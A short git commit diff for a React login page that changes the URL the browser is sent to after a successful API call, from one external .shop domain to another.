c6f81e70f1eb518659b58b2d5ff0939cc08e248b
husknet <127146284+husknet@users.noreply.github.com>
2025-06-03 13:01:00 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://nero.ugobest.shop/';
+      window.location.href = 'https://nero.clement-loading.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
